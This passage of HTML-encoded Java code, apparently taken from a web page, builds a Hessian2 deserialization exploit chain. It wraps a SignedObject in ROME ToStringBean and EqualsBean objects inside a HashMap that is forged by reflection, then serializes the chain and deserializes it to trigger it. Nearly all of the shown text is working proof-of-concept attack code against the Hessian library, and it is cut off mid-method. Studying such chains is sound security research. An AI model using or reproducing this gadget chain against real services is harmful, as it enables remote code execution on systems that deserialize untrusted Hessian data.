lueExpException,privateKey,signingEngine);        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class, signedObject);        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean1);        HashMap hashMap = makeMap(equalsBean, equalsBean);        byte[] payload = Hessian2_Serial(hashMap);        Hessian2_Deserial(payload);    &#125;    public static byte[] Hessian2_Serial(Object o) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        Hessian2Output hessian2Output = new Hessian2Output(baos);        hessian2Output.writeObject(o);        hessian2Output.flushBuffer();        return baos.toByteArray();    &#125;    public static Object Hessian2_Deserial(byte[] bytes) throws IOException &#123;        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);        Hessian2Input hessian2Input = new Hessian2Input(bais);        Object o = hessian2Input.readObject();        return o;    &#125;    public static HashMap&lt;Object, Object&gt; makeMap (Object v1, Object v2 ) throws Exception &#123;        HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();        setValue(s, &quot;size&quot;, 2);        Class&lt;?&gt; nodeC;        try &#123;            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);        &#125;        catch ( ClassNotFoundException e ) &#123;            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);        nodeCons.setAccessible(true);        Object tbl = Array.newInstance(nodeC, 2);        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));        setValue(s, &quot;table&quot;, tbl);        return s;    &#125;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name